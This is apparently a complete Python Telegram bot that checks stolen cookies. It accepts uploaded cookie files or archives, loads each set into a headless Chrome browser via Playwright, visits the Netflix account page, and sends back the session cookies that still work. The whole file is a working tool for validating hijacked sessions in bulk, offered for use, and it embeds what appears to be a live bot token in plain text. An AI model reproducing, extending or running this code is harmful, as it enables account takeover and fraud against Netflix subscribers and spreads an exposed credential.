import os
import uuid
import json
import asyncio
import re
import shutil
import logging
import multiprocessing
from concurrent.futures import ProcessPoolExecutor
import time
from pyunpack import Archive
from telegram import Update, InputFile
from telegram.ext import (
    ApplicationBuilder, MessageHandler, CommandHandler,
    ContextTypes, filters
)

# ========== Configuration ==========
WORKERS = 3  # Maximum worker count
BOT_TOKEN = "8495284623:AAEyQ5XqAD9muGHwtCS05j2znIH5JzglfdQ"
TARGET_URL = "https://www.netflix.com/account"

# ========== Logging ==========
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== Helpers ==========

def normalize_cookie(c):
    out = {
        "name": c["name"],
        "value": c["value"],
        "domain": c.get("domain"),
        "path": c.get("path", "/"),
        "httpOnly": c.get("httpOnly", False),
        "secure": c.get("secure", False),
    }
    if "expires" in c and isinstance(c["expires"], (int, float)):
        out["expires"] = c["expires"]

    ss = c.get("sameSite", "").lower()
    mapping = {
        "lax": "Lax",
        "strict": "Strict",
        "none": "None",
        "no_restriction": "None",
        "unspecified": "Lax",
        "": "Lax"
    }
    out["sameSite"] = mapping.get(ss, "Lax")
    return out

def next_export_filename(base="working", ext=".txt", worker_id=None):
    if worker_id:
        base = f"{base}_w{worker_id}"
    files = [f for f in os.listdir() if f.startswith(base) and f.endswith(ext)]
    nums = [int(re.search(rf"{base}(\d+){ext}", f).group(1)) for f in files if re.search(rf"{base}(\d+){ext}", f)]
    next_num = max(nums, default=0) + 1
    return f"{base}{next_num}{ext}"

def parse_netscape_cookies(file_path):
    """Parse Netscape cookie format to JSON format"""
    cookies = []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                # Skip comments and empty lines
                if not line or line.startswith('#'):
                    continue
                
                # Split by tabs
                parts = line.split('\t')
                if len(parts) >= 7:
                    domain = parts[0]
                    domain_specified = parts[1].upper() == 'TRUE'
                    path = parts[2]
                    secure = parts[3].upper() == 'TRUE'
                    expires = int(parts[4]) if parts[4] and parts[4] != '0' else None
                    name = parts[5]
                    value = parts[6]
                    
                    cookie = {
                        "name": name,
                        "value": value,
                        "domain": domain,
                        "path": path,
                        "secure": secure,
                        "httpOnly": False,
                        "sameSite": "lax"
                    }
                    
                    if expires:
                        cookie["expires"] = expires
                    
                    cookies.append(cookie)
                    
    except Exception as e:
        logger.error(f"Failed to parse Netscape cookies: {e}")
        return None
    
    return cookies

# ========== Standalone Worker Process Function ==========
def process_cookie_file_worker(input_path, worker_id, filename):
    """
    Standalone worker function that runs in a completely separate process
    Each worker gets its own browser instance
    """
    import asyncio
    import json
    import logging
    
    # Set up logging for worker process
    worker_logger = logging.getLogger(f"Worker-{worker_id}")
    
    async def _process_with_browser():
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            worker_logger.error(f"[Worker {worker_id}] Playwright not available in worker process")
            return None
            
        worker_logger.info(f"[Worker {worker_id} - PID {os.getpid()}] Processing: {filename}")
        start_time = time.time()
        
        # Try to detect file format
        try:
            with open(input_path, "r", encoding="utf-8") as f:
                first_line = f.readline().strip()
                f.seek(0)  # Reset file pointer
                
                # Check if it's Netscape format
                if first_line.startswith('#') or '\t' in first_line:
                    worker_logger.info(f"[Worker {worker_id}] Detected Netscape cookie format for {filename}")
                    all_cookies = parse_netscape_cookies(input_path)
                    if not all_cookies:
                        return None
                else:
                    # Try JSON format
                    worker_logger.info(f"[Worker {worker_id}] Attempting JSON cookie format for {filename}")
                    try:
                        data = json.load(f)
                        all_cookies = data if isinstance(data, list) else [data]
                    except json.JSONDecodeError:
                        worker_logger.error(f"[Worker {worker_id}] {filename} is neither valid JSON nor Netscape format")
                        return None
                        
        except Exception as e:
            worker_logger.error(f"[Worker {worker_id}] Failed to read file {filename}: {e}")
            return None

        playwright_cookies = []
        for c in all_cookies:
            try:
                playwright_cookies.append(normalize_cookie(c))
            except Exception as e:
                worker_logger.warning(f"[Worker {worker_id}] Skipping malformed cookie in {filename}: {e}")

        if not playwright_cookies:
            worker_logger.error(f"[Worker {worker_id}] No valid cookies in {filename}")
            return None

        # Launch separate browser instance for this worker
        worker_logger.info(f"[Worker {worker_id}] 🌐 Launching Chrome browser for {filename}...")
        
        async with async_playwright() as p:
            # Each worker gets its own browser with unique user data dir
            user_data_dir = f"/tmp/chrome_worker_{worker_id}_{os.getpid()}_{int(time.time())}"
            
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    f"--user-data-dir={user_data_dir}",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-software-rasterizer",
                    f"--remote-debugging-port={9222 + worker_id}"  # Unique debugging port
                ]
            )
            
            context = await browser.new_context()
            worker_logger.info(f"[Worker {worker_id}] ✅ Chrome launched for {filename}")

            try:
                await context.add_cookies(playwright_cookies)
                worker_logger.info(f"[Worker {worker_id}] 🍪 Cookies injected for {filename}")
            except Exception as e:
                worker_logger.warning(f"[Worker {worker_id}] Cookie inject failed for {filename}: {e}")
                await browser.close()
                # Cleanup user data dir
                if os.path.exists(user_data_dir):
                    shutil.rmtree(user_data_dir, ignore_errors=True)
                return None

            page = await context.new_page()
            worker_logger.info(f"[Worker {worker_id}] 🔍 Checking Netflix account for {filename}...")
            
            try:
                await page.goto(TARGET_URL, wait_until="load", timeout=30000)
                await page.wait_for_load_state("networkidle", timeout=15000)
            except Exception as e:
                worker_logger.error(f"[Worker {worker_id}] Navigation failed for {filename}: {e}")
                await browser.close()
                if os.path.exists(user_data_dir):
                    shutil.rmtree(user_data_dir, ignore_errors=True)
                return None

            current_url = page.url
            worker_logger.info(f"[Worker {worker_id}] Current URL for {filename}: {current_url}")

            if current_url.startswith(TARGET_URL):
                worker_logger.info(f"[Worker {worker_id}] ✅ VALID session for {filename}")
                new_cookies = await context.cookies()

                if not new_cookies:
                    worker_logger.error(f"[Worker {worker_id}] No cookies returned for {filename}")
                    await browser.close()
                    if os.path.exists(user_data_dir):
                        shutil.rmtree(user_data_dir, ignore_errors=True)
                    return None

                # Process cookies for export
                for cookie in new_cookies:
                    if "sameSite" in cookie and isinstance(cookie["sameSite"], str):
                        s = cookie["sameSite"].lower()
                        mapping = {"lax": "lax", "strict": "strict", "none": "no_restriction"}
                        cookie["sameSite"] = mapping.get(s, "lax")

                export_path = next_export_filename(worker_id=worker_id)
                with open(export_path, "w", encoding="utf-8") as f:
                    json.dump(new_cookies, f, separators=(",", ":"))
                
                processing_time = time.time() - start_time
                worker_logger.info(f"[Worker {worker_id}] ✅ {filename} processed successfully in {processing_time:.2f}s")

                await browser.close()
                
                # Cleanup user data dir
                if os.path.exists(user_data_dir):
                    shutil.rmtree(user_data_dir, ignore_errors=True)
                
                return export_path
            else:
                worker_logger.warning(f"[Worker {worker_id}] ❌ INVALID session for {filename} - redirected to: {current_url}")
                await browser.close()
                if os.path.exists(user_data_dir):
                    shutil.rmtree(user_data_dir, ignore_errors=True)
                return None
    
    # Run the async function
    try:
        return asyncio.run(_process_with_browser())
    except Exception as e:
        worker_logger.error(f"[Worker {worker_id}] Process failed for {filename}: {e}")
        return None

# ========== Dynamic Worker Pool Management ==========
class DynamicWorkerPool:
    def __init__(self, max_workers=WORKERS):
        self.max_workers = max_workers
        self.executor = None
    
    def get_optimal_workers(self, file_count):
        """Calculate optimal worker count based on file count"""
        return min(file_count, self.max_workers)
    
    def start(self, worker_count):
        if self.executor:
            self.stop()
        
        self.executor = ProcessPoolExecutor(
            max_workers=worker_count,
            mp_context=multiprocessing.get_context('spawn')
        )
        logger.info(f"🚀 Started dynamic worker pool with {worker_count} workers")
    
    def stop(self):
        if self.executor:
            self.executor.shutdown(wait=True)
            self.executor = None
            logger.info("🛑 Worker pool stopped")
    
    async def process_single_file(self, file_path):
        """Process single file with 1 worker"""
        worker_count = 1
        self.start(worker_count)
        
        loop = asyncio.get_event_loop()
        try:
            logger.info(f"🔄 Processing single file with Worker 1")
            
            result = await loop.run_in_executor(
                self.executor,
                process_cookie_file_worker,
                file_path,
                1,
                os.path.basename(file_path)
            )
            
            return result
        except Exception as e:
            logger.error(f"❌ Single file processing failed: {e}")
            return None
        finally:
            self.stop()
    
    async def process_multiple_files(self, file_paths_and_names):
        """Process multiple files with optimal worker count"""
        file_count = len(file_paths_and_names)
        worker_count = self.get_optimal_workers(file_count)
        
        self.start(worker_count)
        
        logger.info(f"🚀 Processing {file_count} files with {worker_count} parallel workers")
        
        tasks = []
        loop = asyncio.get_event_loop()
        
        for i, (file_path, filename) in enumerate(file_paths_and_names):
            worker_id = (i % worker_count) + 1
            
            task = loop.run_in_executor(
                self.executor,
                process_cookie_file_worker,
                file_path,
                worker_id,
                filename
            )
            tasks.append((task, filename))
        
        # Wait for all tasks to complete
        results = []
        completed = 0
        
        for task, filename in tasks:
            try:
                result = await task
                completed += 1
                logger.info(f"📄 Completed {completed}/{file_count}: {filename}")
                results.append((result, filename))
            except Exception as e:
                logger.error(f"❌ Failed to process {filename}: {e}")
                results.append((None, filename))
        
        self.stop()
        return results

# Global dynamic worker pool
worker_pool = DynamicWorkerPool(max_workers=WORKERS)

async def send_result(update, exported_path, filename=None):
    if exported_path and os.path.isfile(exported_path):
        file_size = os.path.getsize(exported_path)
        if file_size > 10:
            display_name = f"processed_{filename}" if filename else os.path.basename(exported_path)
            with open(exported_path, "rb") as f:
                await update.message.reply_document(
                    document=InputFile(f, filename=display_name)
                )
        else:
            await update.message.reply_text(f"❌ {filename or 'File'} exported but too small or empty.")
        
        # Clean up the exported file
        try:
            os.remove(exported_path)
        except:
            pass
    else:
        await update.message.reply_text(f"❌ {filename or 'File'} processing failed or invalid cookies.")

# ========== Bot Commands ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👋 Welcome to Smart Cookie Processor Bot!\n\n"
        f"🧠 Intelligent worker allocation:\n"
        f"• 1 file = 1 worker\n"
        f"• 2 files = 2 workers\n"
        f"• 3+ files = {WORKERS} workers\n\n"
        f"🌐 Each worker uses separate Chrome browser\n"
        f"⚡ Optimized for your file count\n\n"
        f"Send me cookie files (.txt, .zip, .rar)!"
    )

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🏓 Pong!\n"
        f"⚙️ Max Workers: {WORKERS}\n"
        f"🧠 Dynamic allocation enabled\n"
        f"🔧 Pool Status: {'Running' if worker_pool.executor else 'Stopped'}"
    )

async def workers_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"⚙️ Dynamic Worker Pool Info:\n\n"
        f"• Max Workers: {WORKERS}\n"
        f"• Current Status: {'🟢 Running' if worker_pool.executor else '🔴 Stopped'}\n"
        f"• Allocation Strategy:\n"
        f"  - 1 file → 1 worker\n"
        f"  - 2 files → 2 workers\n"
        f"  - 3+ files → {WORKERS} workers\n"
        f"• Each worker = separate Chrome browser\n"
        f"• Process ID: {os.getpid()}"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ Please send a valid file.")
        return

    file_ext = os.path.splitext(document.file_name)[-1].lower()

    if file_ext not in [".txt", ".zip", ".rar"]:
        await update.message.reply_text("❌ Please send a `.txt`, `.zip`, or `.rar` file only.")
        return

    unique_id = uuid.uuid4().hex[:8]
    downloaded_name = f"upload_{unique_id}{file_ext}"
    telegram_file = await document.get_file()
    await telegram_file.download_to_drive(downloaded_name)

    if file_ext == ".txt":
        await update.message.reply_text(f"🔄 Processing single file with 1 dedicated worker...")
        start_time = time.time()
        
        exported_path = await worker_pool.process_single_file(downloaded_name)
        
        processing_time = time.time() - start_time
        await send_result(update, exported_path, document.file_name)
        
        try:
            os.remove(downloaded_name)
        except:
            pass
            
        await update.message.reply_text(f"⏱️ Completed in {processing_time:.2f} seconds")
        
    else:
        extract_dir = f"extracted_{unique_id}"
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            Archive(downloaded_name).extractall(extract_dir)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to extract archive: {e}")
            shutil.rmtree(extract_dir)
            os.remove(downloaded_name)
            return

        # Collect all .txt files
        file_paths_and_names = []
        for root, dirs, files in os.walk(extract_dir):
            for filename in files:
                if filename.endswith(".txt"):
                    file_paths_and_names.append((os.path.join(root, filename), filename))
        
        if not file_paths_and_names:
            await update.message.reply_text("❌ No valid `.txt` cookie files found in the archive.")
            shutil.rmtree(extract_dir)
            os.remove(downloaded_name)
            return
        
        file_count = len(file_paths_and_names)
        worker_count = worker_pool.get_optimal_workers(file_count)
        
        await update.message.reply_text(
            f"📁 Found {file_count} cookie files\n"
            f"🧠 Allocating {worker_count} workers (optimal for {file_count} files)\n"
            f"🚀 Starting parallel processing..."
        )
        
        start_time = time.time()
        
        # Process files with optimal worker count
        results = await worker_pool.process_multiple_files(file_paths_and_names)
        
        # Send results
        processed = 0
        for result_path, original_filename in results:
            if result_path:
                await send_result(update, result_path, original_filename)
                processed += 1

        processing_time = time.time() - start_time
        
        if processed == 0:
            await update.message.reply_text("❌ No valid cookie files were processed successfully.")
        else:
            await update.message.reply_text(
                f"✅ Results Summary:\n"
                f"📊 Processed: {processed}/{file_count} files\n"
                f"👥 Workers used: {worker_count}\n"
                f"⏱️ Total time: {processing_time:.2f}s\n"
                f"⚡ Average: {processing_time/file_count:.2f}s per file"
            )

        # Cleanup
        shutil.rmtree(extract_dir)
        try:
            os.remove(downloaded_name)
        except:
            pass

# ========== Application Lifecycle ==========

async def post_init(app):
    await app.bot.delete_webhook(drop_pending_updates=True)
    me = await app.bot.get_me()
    logger.info(f"✅ Logged in as @{me.username} ({me.id})")
    logger.info(f"🧠 Smart worker allocation: max {WORKERS} workers")

if __name__ == "__main__":
    # Set multiprocessing start method for proper isolation
    multiprocessing.set_start_method('spawn', force=True)
    
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("workers", workers_info))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    try:
        print(f"🤖 Smart Cookie Processor Bot running!")
        print(f"🧠 Dynamic worker allocation (max {WORKERS})")
        print(f"⚡ Optimal performance for any file count!")
        app.run_polling(drop_pending_updates=True)
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped by user")
    finally:
        worker_pool.stop()
